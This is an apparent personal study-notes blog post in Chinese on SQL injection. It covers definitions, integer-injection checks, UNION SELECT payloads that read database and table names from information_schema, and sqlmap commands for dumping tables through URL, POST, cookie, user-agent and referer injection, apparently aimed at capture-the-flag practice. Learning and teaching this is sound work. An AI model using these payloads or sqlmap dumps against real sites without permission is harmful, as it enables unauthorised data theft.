@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="sql注入学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入学习">
+<meta property="og:url" content="http://example.com/2021/05/23/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="wha1e乐园">
+<meta property="og:description" content="sql注入学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-23T12:57:19.348Z">
+<meta property="article:modified_time" content="2021-07-28T12:20:52.674Z">
+<meta property="article:author" content="wha1e">
+<meta property="article:tag" content="note">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/05/23/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sql注入学习 | wha1e乐园</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">wha1e乐园</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/23/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wha1e">
+      <meta itemprop="description" content="塔塔开,一直摸塔塔开">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wha1e乐园">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入学习
+        </h1>
+
+        <div class="post-meta">
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-23 20:57:19" itemprop="dateCreated datePublished" datetime="2021-05-23T20:57:19+08:00">2021-05-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-28 20:20:52" itemprop="dateModified" datetime="2021-07-28T20:20:52+08:00">2021-07-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>sql注入学习笔记</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>笔者从完全不懂sql注入开始学习，在广大的互凉网上寻找资源，所以更多内容为搜集到的内容汇总。上传博客的目的是促进自己学习。如果摘抄至某篇博客的内容会附上链接。</p>
+<h1 id="sql注入是什么"><a href="#sql注入是什么" class="headerlink" title="sql注入是什么"></a>sql注入是什么</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> SQL注入即是指<strong>web应用程序</strong>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<strong>SQL语句</strong>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<strong>数据库服务器</strong>执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
+<li>广泛性</li>
+<li>隐蔽性</li>
+<li>危害大</li>
+<li>操作方便</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对<strong>WEB服务器</strong>进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>假设某网站页面显示时URL为<a target="_blank" rel="noopener" href="http://www.example.com/?test=123%EF%BC%8C%E6%AD%A4%E6%97%B6URL%E5%AE%9E%E9%99%85%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%A0%E9%80%92%E4%BA%86%E5%80%BC%E4%B8%BA123%E7%9A%84%E5%8F%98%E9%87%8Ftest%EF%BC%8C%E8%BF%99%E8%A1%A8%E6%98%8E%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%BB%93%E6%9E%9C%E3%80%82%E7%94%B1%E6%AD%A4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A8URL%E4%B8%AD%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%89%A7%E8%A1%8C%E3%80%82%E5%8F%A6%E5%A4%96%EF%BC%8C%E5%9C%A8%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0SQL%E8%AF%AD%E5%8F%A5%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%88%9B%E5%BB%BA%E6%89%80%E9%9C%80%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%8BSQL%E8%AF%AD%E5%8F%A5%E5%9C%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E8%A2%AB%E5%8A%A8%E6%80%81%E7%9A%84%E6%9E%84%E9%80%A0%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9D%A1%E4%BB%B6%E4%BA%A7%E7%94%9F%E4%B8%8D%E5%90%8C%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%EF%BC%8C%E6%AF%94%E5%A6%82%E9%9C%80%E8%A6%81%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E8%A6%81%E6%B1%82%E6%9D%A5%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E3%80%82%E8%BF%99%E6%A0%B7%E7%9A%84%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E5%85%B6%E5%AE%9E%E4%B8%BASQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%95%99%E4%B8%8B%E4%BA%86%E5%BE%88%E5%A4%9A%E7%9A%84%E5%8F%AF%E4%B9%98%E4%B9%8B%E6%9C%BA%E3%80%82">http://www.example.com?test=123，此时URL实际向服务器传递了值为123的变量test，这表明当前页面是对数据库进行动态查询的结果。由此，我们可以在URL中插入恶意的SQL语句并进行执行。另外，在网站开发过程中，开发人员使用动态字符串构造SQL语句，用来创建所需的应用，这种情况下SQL语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的SQL语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为SQL注入攻击留下了很多的可乘之机。</a></p>
+<h1 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h1><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and  1=1，则会推导为string类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。 </p>
+<h3 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h3><ol>
+<li>url为 **<a target="_blank" rel="noopener" href="https://www.wha1e.cn/text?id=1&#39;**%E6%97%B6">https://www.wha1e.cn/text?id=1&#39;**时</a> 有一个多余的“**’**”使查询错误</li>
+<li>url为 <strong><a target="_blank" rel="noopener" href="https://www.wha1e.cn/text?id=1">https://www.wha1e.cn/text?id=1</a> and 1 = 1</strong> 时, 没有报错, 除非在代码处做了限制(不允许有and字符串)</li>
+<li>url为 <strong><a target="_blank" rel="noopener" href="https://www.wha1e.cn/text?id=1">https://www.wha1e.cn/text?id=1</a> and 1 = 2</strong> 时, 由于1=2不成立, 也会报错</li>
+</ol>
+<h3 id="注入实例"><a href="#注入实例" class="headerlink" title="注入实例"></a>注入实例</h3><p>在浏览器地址栏输入：<code>learn.me/sql/article.php?id=1</code>，这是一个get型接口，发送这个请求相当于调用一个查询语句：</p>
+<p><code>$sql = &quot;SELECT * FROM article WHERE id =&quot;,$id</code><br>正常情况下，应该返回一个id=1的文章信息。那么，如果在浏览器地址栏输入：<code>learn.me/sql/article.php?id=-1 OR 1 =1</code>，这就是一个SQL注入攻击了，可能会返回所有文章的相关信息。为什么会这样呢？</p>
+<p>这是因为，id = -1永远是false，1=1永远是true，所有整个where语句永远是ture，所以where条件相当于没有加where条件，那么查询的结果相当于整张表的内容</p>
+<p><strong>原文链接：</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/github_36032947/article/details/78442189">https://blog.csdn.net/github_36032947/article/details/78442189</a></p>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.检查是否存在注入</p>
+<p><code>and 1=1 返回正确</code></p>
+<p><code>and 1=2 返回错误</code> </p>
+<p>2.猜字段</p>
+<p><code>order by x</code>(x为数字)</p>
+<p>得出字段数</p>
+<p>3.爆数据库名</p>
+<p><code>?id=1 and 1=2 union select 1,database()</code></p>
+<p>得到数据库名称</p>
+<p>4.爆列表</p>
+<p><code>?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#39;sqli&#39;</code>(sqli为数据库名)</p>
+<p><del>因为感觉没有例题空谈无用，所以先去找相对应的题目了。</del></p>
+<p><del>后续更新。。。</del></p>
+<p><strong>我是鸽子王</strong></p>
+<p>不知不觉就拖了几个月，经历了很多，招新工作已经开始展开了，还是一个菜鸡。</p>
+<p>下面附上sqlmap使用教程：</p>
+<h1 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h1><p>有人说sqlmap没有灵魂，但是不可否认sqlmap的便利性，只要是人就会出错，就会有忘记的点，但是工具不会。</p>
+<p>我从大佬那里取经来的学习过程应该是先学会工具的使用，熟悉其原理，最后可以自己写出相同原理的工具。</p>
+<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><h3 id="1-可以直接url注入"><a href="#1-可以直接url注入" class="headerlink" title="1.可以直接url注入"></a>1.可以直接url注入</h3><p>1.查询是否存在注入点：</p>
+<p>Windows：<code>py -2 sqlmap.py -u &quot;url/?id=XX&quot;</code><br>Linux：<code>sqlmap -u &quot;url/?id=XX&quot;</code><br>后面全在Linux系统下进行<br>2.查询当前数据库：<br><code>sqlmap -u &quot;url/?id=XX&quot; --current-db</code><br>3.查询指定数据库所拥有的数据表：<br>以数据库名sqli为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli --tables</code><br>3.查询指定数据库所拥有的数据表有哪些列：<br>以数据表名fl4g为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli -T fl4g -columns</code><br>4.查询指定数据库所拥有的数据表的数据列的内容：<br>以数据列名为falg为例<br><code>sqlmap -u &quot;url/?id=XX&quot; -D sqli -T fl4g -C flag -dump</code></p>
+<h3 id="2-基于post请求，burp-suite找到注入点，进行注入"><a href="#2-基于post请求，burp-suite找到注入点，进行注入" class="headerlink" title="2.基于post请求，burp suite找到注入点，进行注入"></a>2.基于post请求，burp suite找到注入点，进行注入</h3><p>使用hackbar插件，传入post请求如:id=1</p>
+<p>利用BP抓取返回包，找到注入点，将id=1删除，保存请求包为txt，进行sql注入<br>方法同上，区别在于将“-u”改为“-r”;以绝对路径为”/home/wha1e/1.txt/“为例</p>
+<p>1.查询是否存在注入点：<br>Linux：<code>sqlmap -r /home/wha1e/1.txt/</code><br>后面全在Linux系统下进行<br>2.查询当前数据库：<br><code>sqlmap -r /home/wha1e/1.txt/ --current-db</code><br>3.查询指定数据库所拥有的数据表：<br>以数据库名sqli为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli --tables</code><br>3.查询指定数据库所拥有的数据表有哪些列：<br>以数据表名fl4g为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli -T fl4g -columns</code><br>4.查询指定数据库所拥有的数据表的数据列的内容：<br>以数据列名为falg为例<br><code>sqlmap -r /home/wha1e/1.txt/ -D sqli -T fl4g -C flag -dump</code></p>
+<h3 id="稍有难度的注入"><a href="#稍有难度的注入" class="headerlink" title="稍有难度的注入"></a>稍有难度的注入</h3><h4 id="cookie注入："><a href="#cookie注入：" class="headerlink" title="cookie注入："></a>cookie注入：</h4><p>格式稍微有一点变化，总体流程不变，下面为查询当前数据库的例子：<br><code>sqlmap -u url/? --cookie &quot;id=1&quot; -dbs</code></p>
+<h4 id="使用脚本："><a href="#使用脚本：" class="headerlink" title="使用脚本："></a>使用脚本：</h4><p>在指令行最后输入 :<code>sqlmap -u &quot;url/?id=XX --tamper=XXX.py</code></p>
+<h4 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入:"></a>UA注入:</h4><p>至少需要把等级调到三级</p>
+<p><code>sqlmap -u &quot;url/?id=XX --level 3</code></p>
+<h4 id="referer注入："><a href="#referer注入：" class="headerlink" title="referer注入："></a>referer注入：</h4><p>使用post请求，bp抓包，保存txt。</p>
+<p>命令：<code>sqlmap -r /home/wha1e/1.txt -p referer </code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/note/" rel="tag"># note</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/22/%E8%93%9D%E5%B8%BD%E6%9D%AF/" rel="prev" title="蓝帽杯">
+      <i class="fa fa-chevron-left"></i> 蓝帽杯
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/03/%E4%B8%80%E4%B8%AA%E8%B8%A9%E4%BA%86%E5%A4%A7%E5%8D%8A%E5%B9%B4%E7%9A%84%E5%9D%91/" rel="next" title="关于我和kali的安装之路">
+      关于我和kali的安装之路 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">2.</span> <span class="nav-text">sql注入是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-number">2.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">特点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.2.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">例子</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">整数型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">3.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E5%BC%8F"><span class="nav-number">3.1.2.</span> <span class="nav-text">判断方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.1.3.</span> <span class="nav-text">注入实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.1.4.</span> <span class="nav-text">解题步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="nav-number">4.</span> <span class="nav-text">sqlmap一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-number">4.1.</span> <span class="nav-text">注入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5url%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.1.</span> <span class="nav-text">1.可以直接url注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9F%BA%E4%BA%8Epost%E8%AF%B7%E6%B1%82%EF%BC%8Cburp-suite%E6%89%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.2.</span> <span class="nav-text">2.基于post请求，burp suite找到注入点，进行注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8D%E6%9C%89%E9%9A%BE%E5%BA%A6%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.3.</span> <span class="nav-text">稍有难度的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">4.1.3.1.</span> <span class="nav-text">cookie注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="nav-number">4.1.3.2.</span> <span class="nav-text">使用脚本：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UA%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.3.3.</span> <span class="nav-text">UA注入:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#referer%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">4.1.3.4.</span> <span class="nav-text">referer注入：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wha1e"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wha1e</p>
+  <div class="site-description" itemprop="description">塔塔开,一直摸塔塔开</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wha1e</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
